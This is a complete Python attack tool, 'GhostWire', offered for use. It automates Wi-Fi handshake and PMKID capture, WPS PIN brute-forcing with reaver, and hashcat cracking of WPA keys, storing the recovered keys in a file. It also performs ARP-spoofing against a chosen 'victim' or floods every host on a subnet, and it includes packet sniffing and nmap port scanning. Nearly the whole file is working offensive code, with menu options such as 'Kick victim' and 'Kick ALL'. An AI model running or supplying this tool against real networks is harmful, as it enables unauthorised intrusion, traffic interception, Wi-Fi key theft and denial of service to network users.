#!/usr/bin/env python3
"""
GhostWire – Tactical WiFi Penetration
Author  : Null_Lyfe
License : MIT
"""

from __future__ import annotations

import argparse
import csv
import ipaddress
import json
import logging
import os
import random
import re
import shutil
import signal
import subprocess
import sys
import time
import urllib.request
from datetime import datetime
from pathlib import Path
from subprocess import DEVNULL, PIPE, STDOUT, CalledProcessError, Popen
from threading import Thread
from typing import Iterable, Optional, Sequence, Tuple

# ── optional stubs for CI (GW_TEST_STUB=1) ─────────────────────────────
if os.getenv("GW_TEST_STUB") == "1":
    import types  # pragma: no cover

    for _m in (
        "rich",
        "rich.console",
        "rich.panel",
        "rich.table",
        "rich.progress",
        "rich.live",
        "rich.text",
        "scapy",
        "scapy.all",
    ):
        sys.modules[_m] = types.ModuleType(_m)

from rich import print as rprint                     # type: ignore
from rich.console import Console                     # type: ignore
from rich.live import Live                           # type: ignore
from rich.panel import Panel                         # type: ignore
from rich.progress import (                          # type: ignore
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.table import Table                         # type: ignore
from scapy.all import (                              # type: ignore
    ARP,
    Ether,
    get_if_hwaddr,
    send,
    sniff,
    srp,
    wrpcap,
)

console = Console()

NEON_GREEN = "[bright_green]"
NEON_RED = "[bold red]"
_QUOTES = [
    "Obscurity isn’t security; vigilance is.",
    "The quieter you become, the more you hear.",
    "Amateurs hack systems; pros hack people.",
]

LOG_DIR = Path.home() / ".ghostwire"
LOG_DIR.mkdir(exist_ok=True)
KEY_CSV = LOG_DIR / "cracked_keys.csv"
OUI_PATH = LOG_DIR / "oui.txt"
OUI_URL = "https://standards-oui.ieee.org/oui/oui.txt"

logging.basicConfig(
    filename=LOG_DIR / "ghostwire.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s",
)

ACTIVE_MON: set[str] = set()
POISON_PAIRS: set[Tuple[str, str, str]] = set()  # (victim, gateway, iface)

# ── subprocess helpers ─────────────────────────────────────────────────
def run_cmd(
    cmd: Sequence[str],
    *,
    capture: bool = False,
    allow_fail: bool = False,
) -> str | None:
    """Run external command. Fatal unless allow_fail=True."""
    logging.info("RUN %s", " ".join(cmd))
    try:
        proc = Popen(
            cmd,
            stdout=PIPE if capture else DEVNULL,
            stderr=PIPE if capture else DEVNULL,
            text=True,
        )
        out, err = proc.communicate()
    except FileNotFoundError:
        sys.exit(f"{NEON_RED}✘ {cmd[0]} not found.[/]")

    if proc.returncode and not allow_fail:
        rprint(f"{NEON_RED}✘ Failed: {' '.join(cmd)}[/]")
        if err:
            logging.error(err.strip())
        sys.exit(1)

    return out if capture else None


def run_with_progress(cmd: Sequence[str], desc: str, total: int | None = None) -> None:
    """Run long command with Rich progress bar (optional % parsing)."""
    with Progress(
        SpinnerColumn(style="purple"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None) if total else None,
        TextColumn("{task.percentage:>3.0f}%") if total else None,
        TimeElapsedColumn(),
    ) as prog:
        tid = prog.add_task(desc, total=total or 1)
        try:
            proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, text=True, bufsize=1)
        except FileNotFoundError:
            sys.exit(f"{NEON_RED}✘ {cmd[0]} not found.[/]")
        for line in proc.stdout:  # type: ignore
            if total and "%" in line:
                try:
                    pct = float(line.split("%")[0].split()[-1])
                    prog.update(tid, completed=pct)
                except ValueError:
                    pass
        proc.wait()
        if proc.returncode:
            raise CalledProcessError(proc.returncode, cmd)
        prog.update(tid, completed=total or 1)


# ── root / deps / iface detection ──────────────────────────────────────
def require_root() -> None:
    if os.geteuid() != 0:
        sys.exit(f"{NEON_RED}✘ Root privileges required.[/]")


def check_deps(bins: Iterable[str]) -> None:
    missing = [b for b in bins if shutil.which(b) is None]
    if missing:
        sys.exit(f"{NEON_RED}✘ Missing tools:[/] " + ", ".join(missing))


def detect_wifi_iface() -> str:
    for dev in Path("/sys/class/net").iterdir():
        if (dev / "wireless").exists():
            return dev.name
    out = run_cmd(["iw", "dev"], capture=True, allow_fail=True) or ""
    for ln in out.splitlines():
        if "Interface" in ln:
            return ln.split()[-1]
    sys.exit(f"{NEON_RED}✘ No wireless interface detected.[/]")


# ── resilient monitor-mode helpers ─────────────────────────────────────
def _iface_exists(name: str) -> bool:
    return Path(f"/sys/class/net/{name}").exists()


def enable_monitor(iface: str) -> str:
    """Enable monitor mode and return the actual monitor interface."""
    out = run_cmd(["airmon-ng", "start", iface], capture=True, allow_fail=True) or ""
    m = re.search(r"\bon\s+([a-zA-Z0-9_]+mon)\b", out)
    mon = m.group(1) if m else iface + "mon"

    if not _iface_exists(mon):  # fall back to iw
        run_cmd(["ip", "link", "set", iface, "down"], allow_fail=True)
        run_cmd(["iw", iface, "set", "monitor", "control"], allow_fail=True)
        run_cmd(["ip", "link", "set", iface, "up"], allow_fail=True)
        mon = iface

    ACTIVE_MON.add(mon)
    rprint(f"{NEON_GREEN}✔ Monitor mode enabled → {mon}[/]")
    return mon


def disable_monitor(iface: str) -> None:
    """Disable monitor mode; silently ignore if already gone."""
    if not _iface_exists(iface):
        return

    rc = subprocess.call(
        ["airmon-ng", "stop", iface], stdout=DEVNULL, stderr=DEVNULL
    )
    if rc != 0:  # fallback plain ip/iw
        run_cmd(["ip", "link", "set", iface, "down"], allow_fail=True)
        run_cmd(["iw", "dev", iface, "del"], allow_fail=True)

    ACTIVE_MON.discard(iface)


def start_monitor(iface: str | None) -> str:
    return enable_monitor(iface or detect_wifi_iface())


def stop_monitor(iface: str | None) -> None:
    target = iface or (next(iter(ACTIVE_MON)) if ACTIVE_MON else None)
    if target:
        disable_monitor(target)


# ── MAC-OUI vendor helpers ─────────────────────────────────────────────
_OUI_MAP: dict[str, str] | None = None


def _ensure_oui(force: bool = False) -> None:
    if not force and OUI_PATH.exists() and (
        time.time() - OUI_PATH.stat().st_mtime
    ) < 7 * 24 * 3600:
        return
    console.print("[cyan]↻ Fetching latest OUI registry …[/]")
    with urllib.request.urlopen(OUI_URL, timeout=15) as resp, OUI_PATH.open(
        "wb"
    ) as dst:
        shutil.copyfileobj(resp, dst)


def vendor_lookup(mac: str) -> str:
    global _OUI_MAP
    if _OUI_MAP is None:
        _ensure_oui()
        _OUI_MAP = {}
        rgx = re.compile(r"^([0-9A-F]{6})\s+\(base 16\)\s+(.+)$")
        with OUI_PATH.open() as fh:
            for ln in fh:
                m = rgx.match(ln.strip())
                if m:
                    _OUI_MAP[m.group(1)] = m.group(2).strip()
    oui = mac.upper().replace(":", "")[:6]
    return _OUI_MAP.get(oui, "—")


# ── cracked-key helpers ────────────────────────────────────────────────
def _save_keys_csv(rows: list[Tuple[str, str]]) -> None:
    new = not KEY_CSV.exists()
    with KEY_CSV.open("a", newline="") as f:
        wr = csv.writer(f)
        if new:
            wr.writerow(("timestamp", "target", "key"))
        ts = datetime.now().isoformat(timespec="seconds")
        for t, k in rows:
            wr.writerow((ts, t, k))


def show_keys(rows: list[Tuple[str, str]]) -> None:
    if not rows:
        rprint(f"{NEON_RED}✘ No keys cracked.[/]")
        return
    _save_keys_csv(rows)
    tbl = Table(title="Cracked Keys", header_style="bright_magenta")
    tbl.add_column("Target")
    tbl.add_column("Key / PIN", style="bright_green")
    for t, k in rows:
        tbl.add_row(t, k)
    console.print(tbl)


# ── Wi-Fi operations (scan / handshake / pmkid / wps) ──────────────────
def wifi_scan(iface: str) -> None:
    run_cmd(["airodump-ng", iface])


def capture_handshake(
    iface: str, bssid: str, channel: str, wordlist: str | None = None
) -> None:
    run_with_progress(
        ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", iface],
        "Capturing handshake",
    )
    if wordlist:
        auto_crack("handshake-01.cap", wordlist)


def pmkid_capture(iface: str, wordlist: str | None = None) -> None:
    run_with_progress(
        ["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng"], "Capturing PMKID"
    )
    if wordlist:
        auto_crack("pmkid.pcapng", wordlist)


def wps_attack(iface: str, bssid: str, channel: str) -> None:
    out = run_cmd(
        ["reaver", "-i", iface, "-b", bssid, "-c", channel, "-vv"], capture=True
    )
    pin = psk = None
    for ln in out.splitlines():
        if "WPS PIN:" in ln:
            pin = ln.split(":")[-1].strip()
        if "PSK:" in ln:
            psk = ln.split(":")[-1].strip()
    (LOG_DIR / "wps_creds.json").write_text(
        json.dumps({"bssid": bssid, "pin": pin, "psk": psk}, indent=2)
    )
    show_keys([(bssid, psk or pin or "?")])


# ── Hashcat helpers ────────────────────────────────────────────────────
def _to_22000(capture: str) -> Path:
    out = Path(capture).with_suffix(".22000")
    run_cmd(["hcxpcapngtool", "-o", out, capture])
    return out


def auto_crack(capture: str, wordlist: str) -> None:
    h22000 = _to_22000(capture)
    run_with_progress(
        [
            "hashcat",
            "--status",
            "--status-json",
            "-m",
            "22000",
            "-a",
            "0",
            h22000,
            wordlist,
            "--force",
        ],
        "Hashcat crack",
        total=100,
    )
    show = run_cmd(["hashcat", "--show", "-m", "22000", h22000], capture=True) or ""
    rows: list[Tuple[str, str]] = []
    for ln in show.splitlines():
        parts = ln.split("*")
        if len(parts) >= 3:
            rows.append((parts[1], parts[-1]))
    show_keys(rows)


# ── Packet sniffer with live dash ──────────────────────────────────────
def _make_dash(total: int, rate: float) -> Table:
    tbl = Table.grid()
    tbl.add_column("Metric", style="cyan", justify="right")
    tbl.add_column("Value", style="bright_white")
    tbl.add_row("Packets", str(total))
    tbl.add_row("Rate pkt/s", f"{rate:0.1f}")
    return tbl


def sniff_packets(
    iface: str, count: int, bpf: str | None, save: str | None
) -> None:
    pkts: list = []
    proto_cnt = {"ARP": 0, "TCP": 0, "UDP": 0, "IP": 0, "OTHER": 0}
    start = time.time()

    def _update(pkt) -> None:
        pkts.append(pkt)
        if pkt.haslayer("ARP"):
            proto_cnt["ARP"] += 1
        elif pkt.haslayer("TCP"):
            proto_cnt["TCP"] += 1
        elif pkt.haslayer("UDP"):
            proto_cnt["UDP"] += 1
        elif pkt.haslayer("IP"):
            proto_cnt["IP"] += 1
        else:
            proto_cnt["OTHER"] += 1
        total = len(pkts)
        rate = total / (time.time() - start + 1e-9)
        live.update(_make_dash(total, rate))

    console.rule("[bright_magenta]Sniffing – Ctrl-C to stop")
    with Live(_make_dash(0, 0), console=console, refresh_per_second=2) as live:
        try:
            sniff(
                iface=iface,
                prn=_update,
                filter=bpf,
                count=count if count else 0,
            )
        except KeyboardInterrupt:
            pass

    if save:
        wrpcap(save, pkts)
        rprint(f"{NEON_GREEN}✔ Saved {len(pkts)} packets → {save}[/]")

    summary = Table(title="Protocol Distribution", header_style="bright_magenta")
    summary.add_column("Proto")
    summary.add_column("#", style="cyan")
    for p, n in proto_cnt.items():
        if n:
            summary.add_row(p, str(n))
    console.print(summary)


# ── Port / nmap scanners ───────────────────────────────────────────────
def port_scan(target: str, top: int, udp: bool) -> None:
    flag = "-sU" if udp else "-sS"
    out = run_cmd(
        ["nmap", "-T4", flag, f"--top-ports={top}", target], capture=True
    )
    tbl = Table(title=f"Open Ports on {target}", header_style="bright_magenta")
    tbl.add_column("Port/Proto", style="cyan")
    tbl.add_column("Service")
    rec = False
    for ln in out.splitlines():
        if ln.startswith("PORT"):
            rec = True
            continue
        if rec and ln.strip() and not ln.startswith("Nmap done"):
            port_field, state, service, *_ = ln.split()
            if state == "open":
                tbl.add_row(port_field, service)
    console.print(tbl)


def nmap_scan(target: str, opts: str) -> None:
    out = run_cmd(["nmap", *opts.split(), target], capture=True)
    console.rule(f"[bright_magenta]nmap results for {target}")
    console.print(out)


# ── LAN actions ────────────────────────────────────────────────────────
def lan_scan(subnet: str) -> None:
    net = ipaddress.ip_network(subnet, strict=False)
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net))
    ans, _ = srp(pkt, timeout=2, retry=1, verbose=False)
    tbl = Table(show_header=True, header_style="bright_magenta")
    tbl.add_column("IP", style="cyan")
    tbl.add_column("MAC")
    tbl.add_column("Vendor")
    for _, r in ans:
        tbl.add_row(r.psrc, r.hwsrc, vendor_lookup(r.hwsrc))
    console.print(tbl)


def _restore_arp(victim: str, gateway: str, iface: str) -> None:
    send(ARP(op=2, pdst=victim, psrc=gateway), count=5, iface=iface, verbose=False)
    send(ARP(op=2, pdst=gateway, psrc=victim), count=5, iface=iface, verbose=False)


def _poison(victim: str, gateway: str, iface: str) -> None:
    vict_hw = get_if_hwaddr(iface)
    pkt1 = ARP(op=2, pdst=victim, psrc=gateway, hwsrc=vict_hw)
    pkt2 = ARP(op=2, pdst=gateway, psrc=victim, hwsrc=vict_hw)
    try:
        while True:
            send(pkt1, verbose=False, iface=iface)
            send(pkt2, verbose=False, iface=iface)
            time.sleep(2)
    except KeyboardInterrupt:
        _restore_arp(victim, gateway, iface)
        raise


def kick(victim: str, gateway: str, iface: str) -> None:
    POISON_PAIRS.add((victim, gateway, iface))
    _poison(victim, gateway, iface)


def kickall(subnet: str, gateway: str, iface: str) -> None:
    for ip in ipaddress.ip_network(subnet, strict=False).hosts():
        POISON_PAIRS.add((str(ip), gateway, iface))
        Thread(target=_poison, args=(str(ip), gateway, iface), daemon=True).start()
    rprint("[purple]✜ ARP flood running – Ctrl-C to stop[/]")
    signal.pause()


# ── cleanup (SIGINT + normal exit) ─────────────────────────────────────
def _cleanup(_: Optional[int] = None, __=None) -> None:
    for mon in list(ACTIVE_MON):
        disable_monitor(mon)
    for v, g, i in list(POISON_PAIRS):
        _restore_arp(v, g, i)
    ACTIVE_MON.clear()
    POISON_PAIRS.clear()
    if _ is not None:
        console.print("\n[cyan]↩ Cleanup complete. Exiting.[/]")
        sys.exit(0)


signal.signal(signal.SIGINT, _cleanup)
import atexit

atexit.register(_cleanup)

# ── UI helpers ─────────────────────────────────────────────────────────
def _banner() -> None:
    console.print(
        Panel(
            "[b bright_magenta]GHOSTWIRE[/]",
            subtitle=f"[bright_cyan]{random.choice(_QUOTES)}[/]",
            border_style="cyan",
            padding=(1, 6),
        )
    )


def _menu() -> None:
    g = Table.grid(padding=(0, 2))
    g.add_row("1) Start monitor", "6) Port scan (top-N)")
    g.add_row("2) Stop monitor", "7) nmap custom")
    g.add_row("3) Wi-Fi scan", "8) Kick victim")
    g.add_row("4) Packet sniff", "9) Kick ALL")
    g.add_row("5) LAN scan", "10) Crack capture")
    g.add_row("11) Refresh OUI DB", "0) Quit")
    console.print(Panel(g, title="[bright_magenta]Main Menu[/]", border_style="bright_magenta"))


def interactive() -> None:
    while True:
        _menu()
        ch = console.input("[bright_green]› [/]").strip()

        if ch == "1":
            start_monitor(console.input("Interface (blank=auto) > ").strip() or None)

        elif ch == "2":
            stop_monitor(console.input("Interface (blank=auto) > ").strip() or None)

        elif ch == "3":
            mon = start_monitor(None)
            try:
                wifi_scan(mon)
            finally:
                stop_monitor(mon)

        elif ch == "4":
            sniff_packets(
                console.input("Interface (blank=auto) > ").strip() or detect_wifi_iface(),
                int(console.input("Packet count (0=∞) > ") or "0"),
                console.input("BPF filter (blank=any) > ").strip() or None,
                console.input("Save to pcap (blank=no) > ").strip() or None,
            )

        elif ch == "5":
            lan_scan(console.input("Subnet (e.g. 192.168.1.0/24) > "))

        elif ch == "6":
            port_scan(
                console.input("Target (IP/host) > ").strip(),
                int(console.input("Top N ports [100] > ") or "100"),
                console.input("UDP scan? (y/N) > ").lower().startswith("y"),
            )

        elif ch == "7":
            nmap_scan(
                console.input("Target (IP/host) > ").strip(),
                console.input('nmap options (e.g. "-sV -A -Pn") > ').strip() or "-sV -T4",
            )

        elif ch == "8":
            kick(
                console.input("Victim IP > "),
                console.input("Gateway IP > "),
                console.input("Interface (blank=auto) > ").strip() or detect_wifi_iface(),
            )

        elif ch == "9":
            kickall(
                console.input("Subnet > "),
                console.input("Gateway IP > "),
                console.input("Interface (blank=auto) > ").strip() or detect_wifi_iface(),
            )

        elif ch == "10":
            auto_crack(
                console.input("Capture file > "),
                console.input("Wordlist path > "),
            )

        elif ch == "11":
            _ensure_oui(force=True)
            console.print("[bright_green]✔ OUI database refreshed.[/]")

        elif ch == "0":
            _cleanup()
            sys.exit(0)


# ── CLI parsing ────────────────────────────────────────────────────────
def _cli() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="ghostwire", add_help=False)
    sub = p.add_subparsers(dest="cmd")

    wifi = sub.add_parser("wifi")
    wifi.add_argument("action", choices=["scan", "handshake", "pmkid", "wps"])
    wifi.add_argument("-i", "--iface")
    wifi.add_argument("--bssid")
    wifi.add_argument("--channel")
    wifi.add_argument("--wordlist")

    lan = sub.add_parser("lan")
    lan.add_argument("action", choices=["scan", "kick", "kickall"])
    lan.add_argument("subnet_or_ip")
    lan.add_argument("--gateway")
    lan.add_argument("-i", "--iface")

    sniffp = sub.add_parser("sniff")
    sniffp.add_argument("-i", "--iface")
    sniffp.add_argument("--count", type=int, default=0)
    sniffp.add_argument("--bpf")
    sniffp.add_argument("--save")

    portp = sub.add_parser("ports")
    portp.add_argument("target")
    portp.add_argument("--top", type=int, default=100)
    portp.add_argument("--udp", action="store_true")

    nm = sub.add_parser("nmap")
    nm.add_argument("target")
    nm.add_argument("--opts", default="-sV -T4")

    crack = sub.add_parser("crack")
    crack.add_argument("capture")
    crack.add_argument("wordlist")

    mon = sub.add_parser("monitor")
    mon.add_argument("action", choices=["start", "stop"])
    mon.add_argument("-i", "--iface")

    oui = sub.add_parser("oui")
    oui.add_argument("--force", action="store_true")

    return p


# ── main entry ─────────────────────────────────────────────────────────
def main() -> None:
    require_root()
    _banner()
    check_deps(
        [
            "airmon-ng",
            "airodump-ng",
            "hcxdumptool",
            "hcxpcapngtool",
            "hashcat",
            "reaver",
            "nmap",
            "iw",
        ]
    )
    args = _cli().parse_args()
    if args.cmd is None:
        interactive()
        return

    if args.cmd == "wifi":
        mon = start_monitor(args.iface)
        try:
            if args.action == "scan":
                wifi_scan(mon)
            elif args.action == "handshake":
                if not (args.bssid and args.channel):
                    sys.exit("handshake needs --bssid & --channel")
                capture_handshake(mon, args.bssid, args.channel, args.wordlist)
            elif args.action == "pmkid":
                pmkid_capture(mon, args.wordlist)
            elif args.action == "wps":
                if not (args.bssid and args.channel):
                    sys.exit("wps needs --bssid & --channel")
                wps_attack(mon, args.bssid, args.channel)
        finally:
            stop_monitor(mon)

    elif args.cmd == "lan":
        iface = args.iface or detect_wifi_iface()
        if args.action == "scan":
            lan_scan(args.subnet_or_ip)
        elif args.action == "kick":
            if not args.gateway:
                sys.exit("kick needs --gateway")
            kick(args.subnet_or_ip, args.gateway, iface)
        elif args.action == "kickall":
            if not args.gateway:
                sys.exit("kickall needs --gateway")
            kickall(args.subnet_or_ip, args.gateway, iface)

    elif args.cmd == "sniff":
        sniff_packets(args.iface or detect_wifi_iface(), args.count, args.bpf, args.save)

    elif args.cmd == "ports":
        port_scan(args.target, args.top, args.udp)

    elif args.cmd == "nmap":
        nmap_scan(args.target, args.opts)

    elif args.cmd == "crack":
        auto_crack(args.capture, args.wordlist)

    elif args.cmd == "monitor":
        if args.action == "start":
            start_monitor(args.iface)
        else:
            stop_monitor(args.iface)

    elif args.cmd == "oui":
        _ensure_oui(force=args.force)
        console.print("[bright_green]✔ OUI database up-to-date.[/]")


if __name__ == "__main__":
    main()
